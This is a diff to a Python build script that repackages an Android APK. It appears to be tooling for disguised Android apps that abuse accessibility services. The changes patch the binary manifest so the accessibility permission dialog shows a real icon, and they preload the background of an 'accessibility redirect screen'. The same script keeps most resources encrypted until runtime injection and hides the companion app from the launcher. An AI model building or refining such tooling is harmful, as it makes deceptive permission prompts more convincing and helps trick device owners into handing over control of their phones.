@@ -617,6 +617,14 @@ def step_randomize_res():
         'res/mipmap-hdpi/mipmap0004.png',
         'res/mipmap-xxhdpi/mipmap0000.png',
         'res/xml/xml0000.xml',
+        # draw0079.xml = full-screen purple gradient View background in layout0033.
+        # It references color resources 0x7F050063/64/65 (type=0x05) which live
+        # only in the full ARSC.  Keeping this file unencrypted in the stub APK
+        # lets the View render immediately on first load — the same window that
+        # contains the accessibility redirect screen — before injectResources()
+        # has had a chance to run.  The gradient colors are added to KEEP_ENTRIES
+        # in _build_minimal_arsc_p3 so the stub ARSC can resolve them.
+        'res/drawable/draw0079.xml',
     }
 
     with zipfile.ZipFile(MOD_ASSET, "r") as z:
@@ -2754,6 +2762,144 @@ def _strip_axml_application_icon(manifest_raw: bytes) -> bytes:
     return bytes(axml)
 
 
+def _add_axml_service_icon(manifest_raw: bytes, icon_res_id: int = 0x7F0E0000) -> bytes:
+    """
+    Inject android:icon=<icon_res_id> onto the BIND_ACCESSIBILITY_SERVICE <service>
+    element in a binary AXML manifest.
+
+    Why: _strip_axml_application_icon (Bug 9 fix) removes android:icon from
+    <application> to prevent a crash on icon lookup before the real ARSC is
+    injected at runtime.  Side-effect: Android shows a gray square placeholder
+    in the accessibility permission dialog because there is no icon to display.
+    mipmap0000 (icon_res_id default=0x7F0E0000) is kept unencrypted in the stub
+    APK and resolves from the stub ARSC, so it is safe to reference here.
+
+    The function:
+      1. Finds the <service> that carries android.permission.BIND_ACCESSIBILITY_SERVICE
+      2. Appends a 20-byte android:icon typed-value attribute (reference, type=0x01)
+      3. Increments attr_count in that element header (+1)
+      4. Increments the element chunk size (+20)
+      5. Increments the top-level AXML file size (+20)
+
+    android:icon attr resource ID: 0x0101021B
+    """
+    BIND_ACC_PERM = "android.permission.BIND_ACCESSIBILITY_SERVICE"
+
+    axml = bytearray(manifest_raw)
+    SP = 8
+    sp_size   = struct.unpack_from("<I", axml, SP + 4)[0]
+    str_count = struct.unpack_from("<I", axml, SP + 8)[0]
+    flags     = struct.unpack_from("<I", axml, SP + 16)[0]
+    is_utf8   = bool(flags & (1 << 8))
+    str_start = struct.unpack_from("<I", axml, SP + 20)[0]
+    offsets_abs = SP + 28
+
+    # Build string index → string value
+    strings = {}
+    for i in range(str_count):
+        off = struct.unpack_from("<I", axml, offsets_abs + i * 4)[0]
+        p   = SP + str_start + off
+        try:
+            if is_utf8:
+                cl = axml[p]; p += 1
+                if cl & 0x80: cl = ((cl & 0x7F) << 8) | axml[p]; p += 1
+                bl = axml[p]; p += 1
+                if bl & 0x80: bl = ((bl & 0x7F) << 8) | axml[p]; p += 1
+                s = bytes(axml[p:p + bl]).decode("utf-8", "replace")
+            else:
+                cl = struct.unpack_from("<H", axml, p)[0]; p += 2
+                s  = bytes(axml[p:p + cl * 2]).decode("utf-16-le", "replace")
+            strings[i] = s
+        except Exception:
+            strings[i] = ""
+
+    # Find the string index for "icon" (name_idx to use in the new attr)
+    icon_name_idx = None
+    for idx, s in strings.items():
+        if s == "icon":
+            icon_name_idx = idx
+            break
+    if icon_name_idx is None:
+        print("  [add_service_icon] ⚠️  'icon' string not found in AXML pool — no change")
+        return bytes(axml)
+
+    # Find the android namespace string index
+    android_ns_idx = None
+    for idx, s in strings.items():
+        if s == "http://schemas.android.com/apk/res/android":
+            android_ns_idx = idx
+            break
+    if android_ns_idx is None:
+        print("  [add_service_icon] ⚠️  android namespace string not found — no change")
+        return bytes(axml)
+
+    sp_end   = SP + sp_size
+    tree_pos = sp_end
+
+    while tree_pos < len(axml) - 8:
+        ctype = struct.unpack_from("<H", axml, tree_pos)[0]
+        csize = struct.unpack_from("<I", axml, tree_pos + 4)[0]
+        if csize == 0:
+            break
+
+        if ctype == 0x0102:  # START_ELEMENT
+            attr_start = struct.unpack_from("<H", axml, tree_pos + 24)[0]
+            attr_size  = struct.unpack_from("<H", axml, tree_pos + 26)[0]
+            attr_count = struct.unpack_from("<H", axml, tree_pos + 28)[0]
+
+            # Scan attrs to check if this is the BIND_ACCESSIBILITY_SERVICE service
+            is_acc = False
+            has_icon = False
+            for a in range(attr_count):
+                aoff = tree_pos + 16 + attr_start + a * attr_size
+                name_idx2 = struct.unpack_from("<i", axml, aoff + 4)[0]
+                data_type  = axml[aoff + 15]
+                data_val   = struct.unpack_from("<I", axml, aoff + 16)[0]
+                aname = strings.get(name_idx2, "")
+                sval  = strings.get(data_val, "") if data_type == 0x03 else ""
+                if sval == BIND_ACC_PERM:
+                    is_acc = True
+                if aname == "icon":
+                    has_icon = True
+
+            if is_acc:
+                if has_icon:
+                    print("  [add_service_icon] ℹ️  accessibility service already has android:icon — skipping")
+                    return bytes(axml)
+
+                # Build the 20-byte android:icon attribute record:
+                # ns(4) name(4) rawValue(4) TypedValue[size(2)+res0(1)+dtype(1)+data(4)]
+                new_attr = (
+                    struct.pack("<I", android_ns_idx) +  # ns
+                    struct.pack("<I", icon_name_idx)   +  # name ("icon")
+                    struct.pack("<I", 0xFFFFFFFF)      +  # rawValue (unused typed ref)
+                    struct.pack("<HBB", 8, 0, 0x01)    +  # TypedValue header: size=8,res0=0,type=ref
+                    struct.pack("<I", icon_res_id & 0xFFFFFFFF)  # data = resource ID
+                )
+
+                # Insert the new attr after the last existing attr
+                insert_pos = tree_pos + 16 + attr_start + attr_count * attr_size
+                axml = axml[:insert_pos] + new_attr + axml[insert_pos:]
+
+                # Update attr_count (+1) in the element header (offset +28, 2 bytes)
+                struct.pack_into("<H", axml, tree_pos + 28, attr_count + 1)
+
+                # Update element chunk size (+20)
+                struct.pack_into("<I", axml, tree_pos + 4, csize + 20)
+
+                # Update top-level AXML file size (+20) at offset 4
+                old_total = struct.unpack_from("<I", axml, 4)[0]
+                struct.pack_into("<I", axml, 4, old_total + 20)
+
+                print(f"  [add_service_icon] ✅ android:icon=0x{icon_res_id:08X} injected onto BIND_ACCESSIBILITY_SERVICE service")
+                return bytes(axml)
+
+        tree_pos += csize
+
+    print("  [add_service_icon] ⚠️  BIND_ACCESSIBILITY_SERVICE service not found — no change")
+    return bytes(axml)
+
+
 def _strip_axml_imageview_src(layout_raw: bytes, layout_name: str = "") -> bytes:
     """
     Remove android:src mipmap attributes from ImageView elements in a binary
@@ -3091,6 +3237,15 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
     # Companion is never shown in the launcher — Nova controls the visible icon.
     # Stripping icon attrs from manifest prevents setDefaultIcon from running at all.
     new_manifest = _strip_axml_application_icon(new_manifest)
+
+    # Re-add android:icon specifically to the BIND_ACCESSIBILITY_SERVICE <service>.
+    # _strip_axml_application_icon removes it from <application>, which is correct
+    # (prevents the setDefaultIcon crash).  But Android uses the application icon
+    # to populate the accessibility permission dialog — with it gone the dialog
+    # shows a gray square placeholder.
+    # mipmap0000 (0x7F0E0000) is kept unencrypted in the stub APK and resolves
+    # from the stub ARSC, so it is safe to reference before injectResources() runs.
+    new_manifest = _add_axml_service_icon(new_manifest, icon_res_id=0x7F0E0000)
 
     # Inject android:name="<new_pkg>.<renamed_App>" into <application>.
     # The raw companion APK has NO android:name on <application> — App is never
@@ -5781,6 +5936,7 @@ doNotCompress:
                     'res/mipmap-hdpi/mipmap0004.png',
                     'res/mipmap-xxhdpi/mipmap0000.png',
                     'res/xml/xml0000.xml',
+                    'res/drawable/draw0079.xml',  # purple gradient bg for layout0033
                 }
 
                 with zipfile.ZipFile(MOD_ASSET, 'r') as _z3re:
@@ -5920,10 +6076,13 @@ doNotCompress:
                             return full_arsc[base:base+cc*2].decode('utf-16-le', errors='replace')
 
                     # Collect TABLE_TYPE + TABLE_TYPE_SPEC for needed types only
-                    # Types: bool(0x04), mipmap(0x0E), string(0x10), xml(0x13)
-                    KEEP_TYPES = {0x04, 0x0E, 0x10, 0x13}
+                    # Types: bool(0x04), color(0x05), mipmap(0x0E), string(0x10), xml(0x13)
+                    KEEP_TYPES = {0x04, 0x05, 0x0E, 0x10, 0x13}
                     KEEP_ENTRIES = {
                         0x04: {2, 3, 4},
+                        # color entries 0x63/0x64/0x65 = #FF5C6BC0 / #FF7986CB / #FF3F51B5
+                        # referenced by draw0079.xml (purple gradient background of layout0033)
+                        0x05: {0x63, 0x64, 0x65},
                         0x0e: set(range(5)),
                         0x10: {29, 150},
                         0x13: {0},
@@ -6148,6 +6307,7 @@ doNotCompress:
                     'res/mipmap-hdpi/mipmap0004.png',
                     'res/mipmap-xxhdpi/mipmap0000.png',
                     'res/xml/xml0000.xml',
+                    'res/drawable/draw0079.xml',  # purple gradient bg for layout0033
                     'resources.arsc',
                 }
 
